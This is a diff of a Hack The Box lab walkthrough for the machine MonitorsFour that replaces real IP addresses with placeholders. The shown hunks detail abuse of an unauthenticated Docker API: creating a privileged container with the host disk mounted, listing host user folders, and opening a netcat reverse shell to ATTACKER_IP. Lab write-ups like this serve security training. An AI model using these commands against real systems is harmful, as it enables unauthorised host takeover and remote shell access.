@@ -1,6 +1,6 @@
 # MonitorsFour — HTB (Easy)
 
-> **IP:** `10.129.30.24`
+> **IP:** `TARGET_IP`
 > **Domain:** `monitorsfour.htb`
 > **Host OS:** Windows 11 Pro (Docker Desktop running Linux containers)
 > **Difficulty:** Easy
@@ -19,7 +19,7 @@ Relevant open ports:
 
 ### 1.2 Add host entry
 ```bash
-echo "10.129.30.24 monitorsfour.htb" | sudo tee -a /etc/hosts
+echo "TARGET_IP monitorsfour.htb" | sudo tee -a /etc/hosts
 ```
 
 Possible email target spotted on the site:
@@ -174,8 +174,8 @@ tcp  LISTEN  0  4096  *:9000  *:*
 
 ### 5.3 Unauthenticated Docker API
 ```bash
-curl http://192.168.65.7:2375/version
-curl http://192.168.65.7:2375/containers/json
+curl http://DOCKER_HOST_IP:2375/version
+curl http://DOCKER_HOST_IP:2375/containers/json
 ```
 
 The metadata reveals the project path on the host:
@@ -186,7 +186,7 @@ The metadata reveals the project path on the host:
 ### 5.4 Create a privileged container with full disk mount
 ```bash
 curl -X POST -H "Content-Type: application/json" \
-  http://192.168.65.7:2375/containers/create?name=pwned \
+  http://DOCKER_HOST_IP:2375/containers/create?name=pwned \
   -d '{
     "Image": "alpine:latest",
     "Cmd": ["sleep", "infinity"],
@@ -199,13 +199,13 @@ curl -X POST -H "Content-Type: application/json" \
 
 ### 5.5 Start the container
 ```bash
-curl -X POST http://192.168.65.7:2375/containers/pwned/start
+curl -X POST http://DOCKER_HOST_IP:2375/containers/pwned/start
 ```
 
 ### 5.6 Verify the mount
 ```bash
 curl -X POST -H "Content-Type: application/json" \
-  http://192.168.65.7:2375/containers/pwned/exec \
+  http://DOCKER_HOST_IP:2375/containers/pwned/exec \
   -d '{
     "Cmd": ["ls", "-la", "/mnt/windows/Users"],
     "AttachStdout": true,
@@ -216,12 +216,12 @@ curl -X POST -H "Content-Type: application/json" \
 ### 5.7 Reverse shell from the privileged container
 ```bash
 EXEC_ID=$(curl -s -X POST -H "Content-Type: application/json" \
-  http://192.168.65.7:2375/containers/pwned/exec \
-  -d '{"Cmd": ["nc", "10.10.15.57", "5555", "-e", "/bin/sh"], "AttachStdout": true, "AttachStderr": true}' \
+  http://DOCKER_HOST_IP:2375/containers/pwned/exec \
+  -d '{"Cmd": ["nc", "ATTACKER_IP", "5555", "-e", "/bin/sh"], "AttachStdout": true, "AttachStderr": true}' \
   | grep -o '"Id":"[^"]*"' | cut -d'"' -f4)
 
 curl -X POST -H "Content-Type: application/json" \
-  "http://192.168.65.7:2375/exec/$EXEC_ID/start" \
+  "http://DOCKER_HOST_IP:2375/exec/$EXEC_ID/start" \
   -d '{"Detach": false, "Tty": false}' --no-buffer &
 ```
 
